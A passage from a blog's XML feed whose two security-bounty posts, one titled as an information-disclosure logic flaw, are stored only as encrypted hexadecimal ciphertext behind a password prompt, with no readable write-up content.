89332469da90d932bd1d33fb8e6f0e7b065cecf62c080bbc7af4ea7f0b7d62b3a8521aabf169cb951db0a925ecc3bafe1ccc4dfa01626b63fdff17876af9e8f9d7867fcfad7b3380a758121e7ad2c3a67afc1d48408d9ab87be7699b9eac610c7d53db6d52e9a5bfd1623d95f9bebc9cd21dd7ca4c4e99e3b5bd82500ff41f324c25b40297b9475fe3a7a56f9a3284fa55efa998efe4cea8fd0e89f1a60d2eff262c31b8f954e8e2ddcb4d82164f80f3844baddc2c17800d0d96f00b88aa04d3e2a89788dec914832af4385fd15306e730f6dd4308eb4235c62bc2481acb684dea3d66b972c33925faba037dc9db686634a97a51eae9f8eb55eac25a372c752f8fd83a9fde833fbb0f3c800a44a86f47d197c76a68c31a78778c1589af567911a31323c2afd683b3f79af22995af7c93c3172980fa631b55dacdb5bc2db7b9eace7cf230ab5cb344818c56ebff3532cc0e3b57849b05ddb122d3c7617d4ea03c822d85e9b49705817ca92b44c0adc12d425097b4f6afe15d20c9f43b7b1d2bee05efde4640ca4303b9656ce77a2bfc0d04170c9d8d741e0b54068a3d83a21b51b7cc4f334aee7a817e17c614ca1eb96af20136ed4f6ba9e89272565ac0d8f69405344d08b824c814dc61b5f2acbd491263c72d88adbd60e3df4e345f7fe6f5315e08900aea3b16a456b5d8c18cc8951783cc47399272c37f3513668d6611f433cb3d12801bb51ed559533c0a443fe24a5bbfcf16615783260b500386bd4fe75f9397e67a931ca9ccae924168b05eddbefa627a5bcd8727fdf7d85855c6cf5e656517e9f274f170ad9a716c08e8c4e4b02c6eaf9ab24c50422b1f4e854ed0b284964deaa86feca7cc637d76f092333f3f1df2267ea24c122275c69a08282c7e2ea62ddc6fa206d80ce682f589002c5b8d35fd0cfc4fc68d0f45fd60f248f449059ef7ab4c6da155756a1eff0b8e06630a84a2b263fae26bb429b6ac06ded8a95f2b3409dc36d809e83bb4e2ba4ed8a591ed686607f94c5292cc83a494ce61db6756fb70d61978d58664e00e1760c2cb5034e284c2bd74b4b8d684a38af5b3608c1404bd85979cb6522d59d7888655c49dfa1c9820672287e68a2ddbf581f02ad8aaf9ae90619f8b7485cf4f0e907d60572a66a0c8f319d6902c24887bacf6d68016af4e972da49dc26e829e4c9491a5f42184b8bb7276a3ec70e2063edb8db522d8fca9abf3a6879766b851515dbf1bbf926f14b69962fb43e9bf8ad78a15e95afa1956253cb403eafe564627885ca21707d1419fc37b6188c2995f74ff6ced8bdb5b1344f807b248980653e17a4b9d9df7571d214d1f467f5fe8278d839be984e197b3e29c29274cbeda7c102f27bbc67d7fcbb29176d403fde11405197e50b877ccb7c026d5ea0d9bd147023961e2bd65e7daffafa7e86c85616757573e7ed5afa172c58da33dd2ef17ccf9625be21a427f5f99be6521b31f93b6dadcb6706ee7691a24690a01497d190baf595faa3e851462aa085cb64fae89910fb27804671bf5a8183ebc9302824e3962007e975c348001d149edc5c053a35f5e951f2fa4e1db0c10c6126b3299f67b355ecb42313d43506746eee5cfc0545680a7740a18a4024a768db5f2925d068798e12cab7d565fb1157eea797433d093b28312e202b2f3d109a4a8ce5ddd39d1bb78afafe63841eb3c567837ee2b5104a08a0ef6af91fc36f393ab232febff0f6f2e0ff22a1ed31ecfefc54dfead911bfed5faf94ab372d4542f3da9beb87ee8bbe8aab42d86a7e6a6ac3a5fcbd3e84aa8c2e9c5d3c3b4036692e785045324bc3251b1635c4b18f386606c0341a5d982dcae2bdd1c02c1a5bf8bdc49e5d125e9427e2e21f2af5c45759f2af6d7c5601f7a1922733e2056a0a52530229612e414019b7a25549871102e25a9088beef2732357eff4a74d8a7f8680eef7c9eb232e0d3c5047b9417fdebd3ee97f178aad3c75662c42dfcfbaa50ee2438b70b1e0d0fc18de27be3f8c69d5fe72048ae78160520b2e58ea4346084b342890a21fd8e3bb2a034dda08dff7af5f9b139029c9c9786624aa547cfc6811abd66f4488f595b70c2894fbf8b12e219390ee86a5e6d73573d341592f3c48a78c7149145f89065cf7c751bb3b28ad32d151fd8d51210497ee2d9396cb7229c4d7836ae22ae120441024339f0d507c16eac37df24fbb0ea17ba30987bfcecb7c4f5fde2bbf7e31494fa8fbe38128c829300727ea71050c55ee6a71609fa2ba8dfa3df909835722eb5d5f419b11a9e5c457bfcf7c047c49bc6ebd04cdfec9df08ede73203ead62aea45b244ac8cb8fad7bf487ca2f0864ccdda7c4317cdc741b7e3dd4ee14e36f5fa11feb82c759c46621d58865b2ff8a68c097c720fac825729f019976a0fd7f0d2553512b81db1cba3bfd11f2892f2deb41a9d59058e0f009c2a26db456048b1c233d62a1593305a7c37401cb6d9f957817dd35cdd15ca3312be5a8743eacb2060e346ffaffd45708c274ad842247a97f63671cabbb0ed2368680fbd28ee0336da3955ad574c44b733900314965650e35beb7567eeac4f54487d3ef8deab2c2b6f1eb4828961bdd32b879b13d405f0f3e89d8ee3d34a9f1971af45b43707c53aaa9e95887358c5b5dd103b75b6ebfd3e9708c93b6ab30036e6762c759ae3be53faf53082341f2bd6d872a91e0ff04e40cf01e7384860cdb2ab5d90506445a09a4e12dad9aae6778a83f6865c513d7f5914154c57f7430da8e02533fae336727510301f4063001b12c4735d6bdc3f4c365245e96c4384f4eee485201f89616eaab94afe4ca069d023a355b4994807641a66c0b591397c0a6f560bfe6a34c123961cdc43be7e4ae8020c48b94b5884e6314a5ac502717dfeb4b11a5632c3d38e4b98ca484d1bd19f22d4187b6ec8ab6ceb86268e8e632956dbb9cfc8e1678f1ce58f8603d5d77fed1278134a140aac626516eb266903942794bbc6e0ed31ea1aa788e72ede1d9787fe38996037af567f29ebc8bceabffc4a81fcae1b71b30bc131d4f01262f7852dd9634c86b305b64c4f79e8fa336ed1bf6cc6733e190ea4c6e7e80aab514b1e2543796fa319dd51e5a5b0bc153bd3e6db31cea86595b11b93a3414c1ade067d25728a85d12f502974c89bc9e1386665f412d5d8fceb96386c3f5829bedfae80a16cbfb4d762d526ecc9a0b14796ccb3a2cfa82f58ff6b75461bebaa3ae58678f895ebc01c5debec319ac448838725054e245c13926ce3ca5e4588bbba20faf718cffa8121ef4041ebe9903258443ca024d1d874e36be2c57d589045340e0164633c5fc65a847878655c89cf74b5f002a4c3b0ee56a21631b3a791990218e66c5c2321d3c429fb38a86a8c92c84d893e5458a384c656ee681f9f4b6e3fe5943a7440c18612e0246af48a256db0a80f2b306fdd31735e627c8fa89fd92bc133ae26e4546f7cffed828e2bef38f35028fc02123868fad74f5b59aaa2b36845885d3489b17d05e6be7c8289ad1d1e682eeb80bbe3e71847990ce5d70106dc8007e113cbcb6565b6eb83f23905b5f8479dbf3831b1a35d7f107d9e70dc47d51e911537a6ba3713ae70b969b4b46abcc2149f6bc33d4582e14f62c464b94a0e9c748e25fe3e0aeffa82b73063cdbbdb678a36e9bedef5d5d5ae53739378fe4393a9d1e4e341337d6412029e04c8222522fd37fd1a3a6b62df359382bdccdc52178da23f875a41a9a7ca8b898028644442c5825aace658a43c1796d203c220da0a4cb3d47dfdab920a1c25e5ed508fc7293efac67f343129c4c59d4de3b8cb2e919e6cbcd4fcf88307e7b94ac8197d8880f9f65bf21b363c36f7910253c0b4b3f4aa6eb5e1b207ed9d7ca7cea5173136ff38661eaf0e449cb98f381bbd6de951a7747f802fe9f6591ae462b8f606e593b44a79773f14826c646224d35c3fd876dba8a824c88738b9e84c4d529364e6e7f9eb409b9ecbb10c4eab565e14a6ee37766e6d9e7dffdd6bce3f48f64defe9cb4cb5a46c4ef748fcbe6db37ec39ddc828f730b699057849ece1d032d9c31f2fd3955340156a06294229b8de58874542524e06679af148696f7520ae66dffe7cfc04da87e74db6deb94faa739f2f8c6fdeb642063de30d7b33252fae7a7607bac0fdab3a58417f7efaa21cec7419f13a3a02b198723ba5296ce39c4c2fb92dccdefff45ca1c3d3a9598c3a8f69b6aa03110874a22099fd337e283cdef33dbcd7326b2181c51bc9b742914c733e44285d9969740221b46cf33efb54b9464ea3b137054e8d6f2f151cb62ff327dc8bfea945c11988547a27b2584fa2eccdce21c8537a846de82d74f69ccf1d000221d9dd028f7666c5586ea9ebd23ffccbac2290b5afc3b614971e6135c7d6f5a8e471c178091f3b86add271be24b4375d6b0db6f2157f405cb8bc95bdb755b373bf7c2bbe8f570676909fac6349a5cb9be85d0d08042094ef9acf9996c5f79eb4fdf430e5a5f517718fb525e4df220aefe8acb07cac5d5044656a9f7274af37b68e698dcfd1b6b30ef4cbb11d2536329400f9404f3289bd4ab9de52c8672efe014edb4c3c555f41e2028aa551213cba294ec6be14437e2aa0a28b334fbb91cce9a33161e24b1e73c0206afee5315ef6d95eb1198e2603a80959a36f0d02c4cb572ab08b11b2cb524acf63814b9f73e2fb6d2c3649eede957fb267bfb189b44dc7c884ea661e605598474671d16ca4ef71968fba12662deaf946448102c0986adbe471535418d77ac7be3fb9bec4335ab92510dc192756455f1930ea40349d161a30ebb672d268fae5f1d2d91eea994e6aaba33b734f28e8c89a1204f33af843ab6cca694a24539c09a1bfeb200f9da49ee5ccc24941c9c40b0b7c48fece4a2cd306494e3a50af55170b38aea4c68369b6516ac0e8f543327c6a8713aa56302c88d9d14b5eeda26ca458d966b9c9ed4563f86f0385d843697719422d99118a6e847ea2e37207d00f67bcfc8f19b905920ea09fc18c9e24d556c0d03255fce3395935671e0b445dd8e013a5b4d150f21038ff768a9b6f75f5443352b8ed27f2413732984c45f98d7f1ec84e190b765dd8941fbcc45779f4eaf9e91561a8a1fa2a7ef88f3ff4501d224c6ba3e4d5c52ede2b95bd360db701e7c35aecc337148a7e74d217a3b3cfaa55880f09ea9b5d2de860ea6b923757d71473bd13f028911ff89174af6ea1769ce1f60a02d59b661df557a02f494a6d218bc6d6d1cc00d2fcc35f8ddff8d6ed1bca44db54a47e47a9fe1bcaaa1ef3f57869c186f6d47da003bdddf3badc0dd4c784cef789aa4396ec193c6cd2f54a8329bf8ec3cbe389bd86ad0b54f566e5c37b0c28cb686093113b97f1da31d04fbf3a70a8342667db0c5f09989673a179113129c14c38fcca2a9631974068deeb305c2c4f47075858ac6ff6cef0a73ec3cb98b691b03cd12beb3a4ddc616656dace991b6fbe21e048308f9700345e1f7e028636b852ff01ead028fa0739a64d99b2d858aa23b18be63a708badd11d3321420c3f0bf5c95c4133e5cdd16aeb789eef972890c0682957a1bdd506fd4c7435dddcb778bad5b3f6676e9fa00923770a6ceaf32b74e7f70d877ba6708bb763697e9fb559c0ef118cbca76205ee1fc6ab9bb3666323cd5530812ed46e8a154fd04b923f400452b6b0af6c9c98f377287ef997ad58984106065c8ed8273d3586a579fc194a96c572062fd7e7126a262581f70e80b0b33a4d69c0d721dabb1821d36f4320355637aa6c2bc51020636a291e81246c172de70b1e182589bc6f82c6df87fda5204cf481583f32baae4ea893da46c42a190459b9d3cef831c96521e386ad0217566431c2e15de2558dab0454f14b25ab5da481633b2d5a4d984091decd24d8f50dd6d550e51907d23459b67b2426d30b375b4b900d58ade089b377cb0a7267e4a66208b14b020f5154fedbcf4cd2bc4dd545b8d82e9f1c3f1091d5bce004a1f5d46fe7973fed69dbce8fcfcc4da734beb7e5fdcce0947a96ba10b2d72c3b6aa211f2101df110c6d54c7a2adaf4bbab203a91f01b450ffd4f3d71d11b254ef9f05784ac9f6e1ab125e750c0bb325f0269b77053a61b7a997af688c5837a19511528681b627372f886b90fc4ddcf69b30c61f7bcb6197629478427119e2cfda6b9599d58054ba5682f643f3b3cc398200f2d8553836ddfcd01d801349936743880bded16dd532ea656fad38343d76ec51660a36c78a964dc988a786a31ef04ed5ad335d94cf610980feba4ce8fd1ad2f06d804353285ea2d0eada2434e474297327489612ba4fb2ea0cd3950355cc4df568f0c7a955b6b4abd850d6dfe437dc282298e05d462ff3efb18981e805e63da4a25b4239ad19963e6afcabdd077dc7f68ec5dbcd891407bf9513ca11800f2fce5eacd27c1a82b905237e0e68994a4b651cd16cbf48b51f966edcf4b5e4fbb2475347f6054e4095f2f299af71a32ef2dc9bd9263f69b22fa3d9bb7eb86fb52b93a1c3238a04ce381c2d42f9f6b809e1ab50af457759286a30d5193f99b076babd9d2a067275d5329e2a13f0c603ba3856dcf4d9b12c99c1b29eade3ad730717d58a696233ca51591579fff20811968a13782225fce4796a0f35a38f598b1133866d687176e3473888ee19b8992f95148a946c917d7e93d87e0bf1fe871a0d5dd0ed3483dcb3be5eee7f69bf5caaa23e0e9acedbde32dbe889db38da2ddf6611d6ee20fff3cd7347f1c3508844e7e65ccf70ce431b5082eb0acde999b4b0ddffb7c4472273d2c95d254e182fba1a1025577cd28f88de8a0325cc23f71b7ac5daf32f373ea4d69b8e56a9477beb3f1edb7ae679e000891b2cbb388a578805ab7814f621886d97b1208044d0e124b8cbe2e61caf4df92635cdbe581ce10912f31cbeef46dfa48e5610bbc13195942dec0c23e98796920388221f209f813634be4294fd89d9b69c401016a7ddef65e7ed6e5687b5e4366c3ad4b60292cbf18a2bae6bfc9dabfe70ca961402ef8403aa70e8b04f0209e7769f2bf5805bf5a413cebc88d472fc8b332d314c98989333b89ff2b0e92e5cacd172cd36e69f6e0c7378b6fbf4e823e0aebcb9f1c1383a188271ce1515a6069872e5ada56eaa3edf7f4e4e133c8ed10e84f31427ae6ec7549483ac185c8cde6dc649328c1cbd6c3d648cfb96d857e63b16e286796c37222d7f951011b05f5b2c6f453e9c52923253cc54d0b21867828722c79cb3f50e0c69158a7db52095a928596c56c441f254f96007e8f4744de9efcf5770ebc84eeeae91a82bee9e3a7d553e635eec78829e16c6ba00059e80c6c3ea44d1921ed8f882bd03b244a48ddc106afb0e67ecda7c1c30af5033bda36846621a1a35a1eff9d7b346e2712d3534d565c0af7161cfe78ec364f4a46259c090617acedc6607896fc3458523794b79bab23e9319e6b99696746e9164b509d567ac3a5e08e6bd6a50d4407c8718f9ff59d23811506f5d65c687cd6423eddb3821af5902dc4dd27d829770be8f9f55be24bbb29a51e813cb4c4ff1dc591aff358f133ecdde1986f94bf70fa3094d83284506f34b8b7153a05fbc568e10b69564590515785dbf8e54605883e5e1e5a7d9757fe7a241747d32eb6fd389106378e604cb989d08163fc096dc587867ea9deb56cb4a561bebb22294fb5a857a698cc2d0ce7fa6eff62063d04a9d30cc0a1f76357be65928db54992923c54dde9043462a8580bd550a123423bd53d502a9d49f473d42b022e77a22ac35b44e0a5ba201337d8d37a959d13bfdccae5d597036c0bc175b5086bb75ac298d1d052df1eb96dbfe8f9cc595145e394be7be2066127ae5e3a5c55cf81faa1ceba8811a655ce3a4f01ebb63c726d11e36bf1c5c5d4ef2522026e4d8ea5319fa5830fa449c2c43df1c76e14936b9473ccff79be3ea0491b2e4faac76cb2d10475f1680c2b8cf9b5c1822ff7058c2d545474cb9831850eddf27632b361a7e1e6846c1e13030afbfc1f0baec415d591fe43e6f4aab92fcad3e68d56ec76c2703274c819a2dd714d30f8e2d051f8caf3d95aa819c978ea3898e98090f4a8ce96e6c8bf98168b588e258b59ecee57fb181ca767221aeebde8c89fefad3548b6e3bc678853f51dca89b11c7d87a976edc3ddcbfaae54ebb063e1d776cfda8e16b1de0c48554942926f11096bdd17739fd999653ceca96789806780c4b333dad3ca8af3a0b03661e680bf831ec35812a3265ec83d8358bb587c6fdd2f2ba5109a84859b68fb5d6db2dba7cad1032e5825616ac78fbcd372fc4bcf904b67f2a684ae07b0633d42f6b327b9286c1282061f93b68c663b3d08e54ea0fb76eb9c86580a649bf81ce90f047e8eb99395249270fe9b374103520d5df149bcea7f51a933e71a792c93351d6137a407295abfb1e13e1869e17497899f7ee3891120338a9bdd77c4bfaee7b6448e0dd0a1852edfcb2b05a8e60f0ea867c9af4e65587a93970b129bf173374cd3555d5c266b190eb34ac7e0a0ec40a7180f6653cc7b87841af3880345ac482a728df461e583252516f4b124ebd35f55a3625294134a2c500b9713c4bdf7e3ca066171f953322f11e31d70c98799fae0619a3894241b4996e6387b44860beae9b11398365049abc9f55e91528b6d6812ba618195515bc086aa41b4fe16b91daffe450b8f990a582f64e91397b31be00c16912b3b14c37599f9a6cc90fbae6fd97296ddd1d242d1c1704d3a759ffd1c99c0a14eef8646c2e7a083f0aa6ee4da8bbe98a65c48615c556251cb572dfba5433b3f586f72f1a9f94a280711b6bd3f0c25746836b875ca5bf0801855a36a5302ec0ccdf7b3c9c7693695b6401fd8f215cfdd3e89d514a976d61ad330180ba16661783aa26e814a16d2ae851de73d00df5cddecaa120f51bfb2756044de23c750fc0c644c88f0fe8271a85e2a9fca7a0d07e4967782f5cd4d00bc4cf6ad17bf821ed2c2a905781fda6d9e47f085553bd259a5f80a23b6c4957a3cd4e62bfc0e662629c9bf23ca3c75cd69f345b3f560a48eb8853ce8904bdd11ae1fca0ab47980d6012c86b10b7eaa83793bd9749f9b22923ac18f7bbf9ad9703cba342928e46fbded55fb1d3a7930e5054f96a8e0664d65c434fe7b95bc386682c9e6841548c17cba8c18b1a77a650196f8825a3e4991fc099a959b8d6bb21ef9108b0fab6c6dba4ec3d3417a3c6207f896d0e3733dc180ffe3bb06aad7c783390b7c2cb11ff5c93f938ede8fcc5f4ea5e2bfdc31085d4a79e41863d39e941b00ce8e2a13a3c2ba8959b628c866057f94c191aaefac24c2ac8aa1c06c5b9f517b927113b0f17e5b9899e0066a157ae549a9a23f14516441f4be858f53ed8a720c7bd79ba841209aac070b15deef73564636131ca6328b65f37622c206fc7e85c9d6df7ee54dfd20fc47554de1054ffce39fe1857505dd04e282308230f6a903a2b3638a477c7b1a2fdbb9aec113edfe38cc6d43b4d4389948fbf55a0e2e4d58f6056e5e25f050e210f9d7de3007805a231701989bb70d3a29f849086984420854999efe84d73a2dcea81e9fcbf16d41768967940cabbfce58dcd822dbf441a6cd5731f09c807bb179a96d176655f04917f7d3c6806c6746922f71d5186b311257e1e0e9fbf2392affa5b6fe6829905d65c402c4f30bc0f983aec2c0441cc121f466c59166bfdad39e1be7b62475de6865dbf0e9bca6ac1a5832908c7262acde4026f312efeeec30d72e68d0b708eadf7e7dfaff4277b26b4d284ff68dd8cc48c161719f90f5bb8b3cc42be977ce9f41af1f6387f56ca01f5eefa6ca5ae749455aafef9908883ca4291dcb237c380f9de318a2c8856f0efc1eb323a6d767b526481a02595055278f9adeb6ff41c7cdb183952ae91910fcff25159e6906c9ca7a74e7d6a1e9cd8559994180e2b9a4690f0118bf107dc86e5e99310bf675dfd99014d8e9c8ed385c0b460a52e013e30b6d0eba22bd87d23bb3724a40f6405ec8f5457b988532bce588a4df12b8dcfbeb1f46c2f4023030a6c7ef10ab1f21d48419e0beb4b09f19d767d1c0f35e09f0b7c2d03e1aa9040245a2266258f481c98314679f961b0281a8e3d0a3604ae970499abcff1686f791e5a7c76dd914b988c2b02f06cb725130b0ad7f4364db7bce0f0d7e42a0af4bc42338f1ff051a0d323725d0333d4e28997b321dfe0a1398552b6675c227ad1bf85b8b7bc48daec5c75b50f5c324cdd17db77ce9262b319e980e3e0580835ec4f2e6822b524f3e75fe5a60a18c131503b1dff24aa55b05c84cd6aa2738aadc7ef227af1803131ff407846ba98c74c8f3ca2a96a1fc45d686e3a3cef964f90a5b1a5cfb880f5d81849858e9e17d22b1af775adb2abec67f62cf8ec1f6a2e572cb2068a727b67c1b92d6c099cff66a14d099ffc972ace2455f6c52293158266d456d267bd2929f80a0a669f0ef64ec22e80f9eb66b1187218cd99f69ebbee1fcfed69f10053c2c164f14f17e12d6ec8376d35fc13d9f3be87a467fc70c03fe314309135421bc907d593625681b95ec96e0e57260910a09536e3157ad5ebedc1fad9ebcee5074c432171ba950a87ea5d2950a93b0dddc50be61ef3d8746f3c5326a39c1020ef52b9db5dd631cf2728db8b31854ae53fc6737badf9690f46b88139f49d845054a511e206834a3cdf1c455f9a5b14dbf69b3d615f78bd40ab59f0dfac46981a288fc66c6ea08c9b6ae1938d509ee6bf429f4a8a8ed00fe99fcc5f7462a9a7e1ed5d642dc8e818f3bf0831c08b23cf9c7c734c5c14022d4ccd07d00488fa858ea8938d020e12f6e2564962cb942f929ebfff53e8d1fea363f622a2cb7b071a4dcb45430f2c19b79e1e8d966c5375dc89cc555afb8c927cd6e4a8885b59cdddc14a76e8201402f75a643a9a43fdefada2f6f4d430e66af0d6b8ccf3061ab6bbc5befce6a43e0eebc6e398ac6a8f149b9f2cc8801569f26f87403742293d266e74e7943c99d70d761218c9e372ab9ae92c35c405789a8e2a06f66c58ab9fe28019b916697a396607cbc1727ae8e108d5a34180732f902d0010c0f6772f31cc90c96b77c59c191335ab7f87105d28a6963de532152eaab508f8e97fde9110138dced6d4314e50159e2385a16275d41044170bf0951752fe1d8ddaacf0a27ced94cec23045846a812d493427fa0c2cf16c32550b8649a73d88e107ec8743a52639203e465f6d16620d02fed0f3b49ded24895a2a8ed819a8a47633f830d124e0487d88bac8e9009f91adb5d13b978ac322c5bf70966dedf75e3df788b7d8a9596b198abf6ad85ab41f46c562111f251d3f5526b189f7af758ed4ff58065ed420259b745024d386a222532fd2530b0a8b4bf4f1a73d32c3d4b4486b6c7fc9f82d15c3c4296cf94cf4ace5baa30bcc68af6fa3839d6df0d10b2db708ec8898fbd64f233f01119866c78c0d63585c61c3d26d0ca0b20c074be54dc3c07d1b4d9bdf54ac227494aeb0a2a2fb9eb99ed175b2a5a35f83ea9aad7c7805ec973933734a09356cfae8efccb4cd6f0e0a34d8e943e5d8c5c09c47f9afaa17fd340d1ceb23437ab28346ca715c59d266e1a656db749d7c4ea1757b698ed0c74ecb042f340b699defe9d1eec14c6f8337ad2460746995a9f6ffb2c413008bc0de554f6335dbd2b864cd299d8bf5f4b684ed58fa91e2afdbe4f30a6c65d83a64406b0b25255d2bbc961fc8aef1dc5b959921953092a488955c6233c066456b15fb9dbf3b027135c9c18aff7aa2427db2c114ef211e76867fa8a419c96c10150a60d1b47e341653095a4f6783ab206caf54a0218b8a0d48200dbb599cc6824f46da0ad9dbbb94182ee44283e7e15d630baf1857aea75457b1f3ec0cb1ec084a9adbccb1d0c6bcc13aafc521aba85a6592247eaa8d43988eef0393d5d21b1cf4f906cf54bd8e525b9d151886bce05a7a70601ffe485b1f1a9af66f50d0584de59eaf4f20ddc32797dcaa35101eeebc0a5a68eb0650371fd5bd7b32ab1aeced87a315520efee52d9ad446f1e4042809d96574618997b084c161f752c970f1f8496818b46ff593e03a29bd037c09675b2f5ed804b0bc38d0f49369544692b6881b3df1888e730fb4ed59544c8b59d5a6cde621feafe428c87453b9a0e2d9caa1fd1a73e11ab395e3fa5dee3a58fc57aad1b2398c614c9e5d1a4397e18dbef06810ce7788b252a960556f18570e92df79cab732de7656673bf781678a5ef9097aa0050d71ff673bf094f9d681772fc417f5844cc7fb72bfe4e843308d8a6750255db8cded656b17ba34f3dca98a76f947ea45690f96a4afd33ac48e2c9c3d20fd755d3b579216416074e90339ff2b683984316183d75b1db14dd70787c9653c4ae79d56ab4b2c3c055a5213ee63ee845bb8436a3f7973f1ec7e81d259be1b8f818a126479b50bb6d6a44170f93f42aa5e00dc6534b55830301fc073f6a1935e61f6fe44715817b0778f878b89b07c11d54b8d05704d3ec65cae7fa113115a153bd1265205f162333ee3ee9a0c7942a9166bb6fdc4f4e72d8e48ce00516771d8f551b64d78d652769b0231b36fed1a528ab1e37293906131c96445ac958a4a4dbc52dcdf542707767267cfbbbf4d846cf9596a4fb8f2ee9a5c228cc01466fb4f631a68170cb5f4c3d56324157450d4116d2ddf2177d2a27a220cfbef13133bb638b44eb8e852d82381ba560d74525601576133e505fd49289db1ff2d73da2c3920f2f48966c608d65d2a79099b3584cb2c66835e29b1391077e4ef8879cba2e0c80075a05e88d2f5715c589cce24bc650a3e86ce3a12de91ddccf2b4e6c98531b9f7ccb5352a2f842f586c0b0c15e55c8a477bf18b42dcfd5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个信息泄露的逻辑漏洞</title>
    <link href="/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5ee64ec38c4528e73f665567ec4092e09972984aac736c1163cb6e0304230854">80f7af2430a3dce6996ee26d1569b238d40224290ffd561b4853cf1c5c8fc0fb92698844a30ef5d5dbc74ad47696e88800feef693e71a6f93fe4ebcb254909fe85bcd3e4f86b85b174d680365ec6971f4389a6f20baf276c8e29ee2eb555190e827e2207861e828cca1449b31162dfbc4c78b306a39147f7c411fdf11572cf4f257712663a6b76869b13ae1727b2097e1cf1f3c36eeba2d13dbd3c5b142c4ec50465b0ede37cf133792cfb682e0224d14d74b7f4da655c6faf1e493e53ecf2a253a84fbf2961c34738c90103b49a7ef351e53b79ea939e9c33f23e1a030103bb6f0fe9c50ca5c1b046ee11bff155ee8f6ee998847371058bb1087452cbc0dac1e46c9b24072492902482abbf5157a323acd6f4577ed7333b2dc126f4eec07227273121ceec0f2d339fb1dcaa1055b54f3663b2aeb323b7b5e50286dd282e8f63ad9916709b7e7bc2118c7cfb0114e010a6fce7d2d15a0f1a7575ef3ffcf40967df065d42e1064b65fc6955a9726c1ec202946b6d3b644cd2d4262bd08aaece7b1c78c7fa73dfb544e7dc5600fa18e08fc15b8fea18b7345ab25cbf24384adf10226cd80a83386cbdc27784b8759945e2818a5abd6648cac084a310187454a6dbc421aba19a77edb2f48b94c5d9e4a5f1d73b4d05d915cbf907afdb09f381f8139272eeb5e17f2dfab491bb5d08a9ce3097a9d78c33968d505ee4a738d02ad6483ddd0dfb59b3093c0bb5769291ac554e1cd00c113132ad4e7e6d58ae276744d08fb54904415b94a1621ff330a3b2c08a847c0ef8da48889dd41aea4595564e388e1f9786c5a824e4daee6e3e82dde57c449a04de82bbbc01a85c39653bc6d44f3f4c9945b6bee66c86365f52c4d285c8fb0bf9cd7e95874cbdd12bedcd88f2725588effffc532515acb9c1a681838bc7ba5082f6c99b452b24d7e0df3b9a343c7a88ee716babaa2b161df1360d487bb71a38d107643be469683e43d5cfd6030917e4cfb1d3ecf452aaf5329ffdc00f5b40d2e3d67cdbbadcef9f92f5194bc7a69080443c596cea5da55ae4808cfde650fd8ef62a6eb540672670057714a2e229612b62cfe5a98fc21288647317907089edc0355cff9306036455548f06a9a6d89284000f899aa43c9875521dabdb42bd1af21bada1a7810ef723e2e7ac344226e1c66c6d9c7cde59ae191572aa28e0087a254aebfb3d70c6a0257e08c48da4926de5c67b4ad2c5043f56fd80b32257816ff5f2fc421be5cbd6c96b6fcfb4fd5cb1e05e7b5ed20cbf776c3cf602bc3ea154425af6e65558e3df7f0506a3653698165aa58e26f54f0357716400a9db8ebce7141678f2c9da53a4bb1f7cec2537da124188234feab8e41736a48d15c1886de58f9f86dc07fe5982508e5a8957a8e068c47b6794509bc5f9414fca75e3146452872eba6ad4912468314544a33a45ad47da904f5860f814c28ed6f7ae933f75f1f43322c260ac73df4f5c8f0aeb72ba919e3d07d1c6615d6fe4fee95add624aa7352d5920f0e416eced2d1230c31b26ae26c283a5ede75f0275bbc1deec32b4bdadd230b08bb29baec85b2c5bc44f86f46bafab41cbfe3f038fab7288dd092ef63e82652bbf14da9c2ea600526d7e10728131df768b36e84ff898796f0f4b7919285111378b1d0732c146f9b4604584ed76788556201234ed392f79f3d959d4ace11333ea251cab2bea8e10718c4d34876304966a8598da4a184c07255c83d20d79a765163ce26491e8e3252ab86c7030bf18df7d662828fc10e2eadaccc48ac9c71bddfe53da168ca14c395201a89290f8a7e1df08aaebad306c4bd8095ff8693827118923095a5c667ad5214f30023d76422c4f65d750b93e09af2c746bee9e1e65606b7781028cae8aabaa59cda506436e6ab32aeb35c2c98952cf0bf271da041436e492ec4fb6caa34a9cc81a32c38319e0042efb7498ac253a55ab9cd24273bb734913488f7a2f48319265567f9103ff5e2ed5f4c2c84543a742a88beb55ab38e5c30e2796d2cbb1b1388963ea1b3eca15ad372999924dbb30ea6dac9e9aef06dfd940d80b03356819049cfa7702d30361a45f12fbf72ffab303cd94d2d5facf706b991504277170a16e6a84c61c4e1f1b5d4c8d4ed9fdface61826f46492eadccf360de1d4ecfa3a48d934578e1cac6e64179c66f2dccc9545da4b90bb216ef97b77fe2fe6472aafd118f20baf0010e318e132d3207b3748da34946d6ebfd3dad6c4693e2e224a07d8ca0925fb43011ef214b698248d189b430060e3260eb20d15256643231c0e13a87a4f4656b0fbd60019215d22bcfadf87e9271b6bdea7639b31a75a63c2cce1df57b8322fbd1a380efe0987fffb6ebfe75f84a0188e6b0091bd0f0fa6c9c7e0afa601a3bea8d799f24bbfe3a7be24976bb4bfc4ef8e77ebc26d71aead84971c626028c8a6da8a5d54dce25ebe542c4b2202b546fc5d96a0e88808a6db2cac2854b408e42c3da0e2a2b72239e92ab1c3a3f94db0d5192d6b7f0ffc663f9325b09bc3f292bf7fdc3a237956c8369494d4168216823fe660a3d714ff1bd3553af58f1b9848bb198fca86e279fc7d659f11b9777d33a050aa19da5bacd201a51